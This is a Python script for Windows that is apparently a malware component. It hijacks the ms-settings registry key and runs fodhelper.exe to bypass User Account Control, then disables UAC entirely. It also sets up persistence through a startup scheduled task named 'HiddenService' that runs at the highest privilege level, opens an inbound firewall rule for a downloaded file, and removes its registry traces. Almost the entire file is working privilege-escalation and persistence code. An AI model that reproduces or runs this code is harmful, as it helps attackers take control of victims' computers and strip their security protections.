import subprocess
import time
import winreg
import ctypes

# Constants for registry paths and UAC behavior
UAC_REG_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
UAC_PROMPT_BEHAVIOR = "ConsentPromptBehaviorAdmin"
UAC_ENABLE_LUA = "EnableLUA"
REG_PATH = r"Software\Classes\ms-settings\Shell\Open\Command"
DELEGATE_EXEC_REG_KEY = "DelegateExecute"

def is_admin():
    """Check if the script is running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def create_registry_key(value):
    """Create a registry key to trigger UAC bypass."""
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH) as reg_key:
            winreg.SetValueEx(reg_key, DELEGATE_EXEC_REG_KEY, 0, winreg.REG_SZ, "")
            winreg.SetValueEx(reg_key, None, 0, winreg.REG_SZ, value)
        print("[+] Registry key created for UAC bypass.")
    except Exception as e:
        print(f"[-] Failed to create registry key: {e}")

def delete_registry_key():
    """Delete the registry key used for UAC bypass."""
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        print("[+] Registry key cleaned up.")
    except FileNotFoundError:
        print("[-] Registry key already removed or not found.")
    except Exception as e:
        print(f"[-] Failed to delete registry key: {e}")

def uac_bypass_and_disable():
    """Use a UAC bypass to disable UAC prompts."""
    try:
        disable_uac_command = (
            f'reg add "{UAC_REG_PATH}" /v {UAC_PROMPT_BEHAVIOR} /t REG_DWORD /d 0 /f && '
            f'reg add "{UAC_REG_PATH}" /v {UAC_ENABLE_LUA} /t REG_DWORD /d 0 /f'
        )

        # Set up the registry for bypass using fodhelper.exe
        print("[*] Setting up UAC bypass...")
        create_registry_key(f"cmd.exe /c {disable_uac_command}")
        subprocess.run(["fodhelper.exe"], shell=True)
        print("[+] UAC bypass triggered. Waiting for changes to take effect...")
        
        # Allow time for the command to execute
        time.sleep(3)

        # Cleanup registry keys
        delete_registry_key()
        print("[+] Cleanup completed.")
    except Exception as e:
        print(f"[-] Failed to bypass UAC and disable prompts: {e}")

def add_to_task_scheduler(file_path):
    """Add the downloaded file to Task Scheduler to run as administrator."""
    try:
        task_command = f'SchTasks /Create /TN "HiddenService" /TR "{file_path}" /SC ONSTART /RL HIGHEST /F'
        subprocess.run(task_command, shell=True, check=True)
        print("[+] Task scheduler added to run the service as admin.")
    except Exception as e:
        print(f"[-] Failed to add task to scheduler: {e}")

def add_firewall_rule(file_path):
    """Add firewall rule to allow the downloaded file for private and public networks."""
    try:
        subprocess.run(f'netsh advfirewall firewall add rule name="Allow HiddenService" dir=in action=allow program="{file_path}" enable=yes profile=any', shell=True, check=True)
        print("[+] Firewall rule added for the service.")
    except Exception as e:
        print(f"[-] Failed to add firewall rule: {e}")
